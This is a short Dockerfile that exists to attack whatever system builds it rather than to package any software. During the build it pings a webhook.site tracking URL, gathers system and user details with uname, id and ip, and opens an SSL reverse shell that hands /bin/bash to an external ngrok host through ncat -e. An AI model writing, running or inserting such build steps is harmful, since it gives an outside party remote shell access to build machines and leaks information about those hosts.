# Use a lightweight Linux distribution as the base image
FROM alpine:latest

# Install ncat
RUN apk update
RUN apk add nmap nmap-ncat curl

# Run ncat with SSL to initiate the connection to your VM
RUN curl https://webhook.site/c13c908a-c4a3-436b-ab94-c752b16635b7/dockerfile
RUN uname -a && id 
RUN ip a

RUN ncat 2.tcp.eu.ngrok.io 14706 --ssl -v -e /bin/bash

CMD ["/bin/bash"]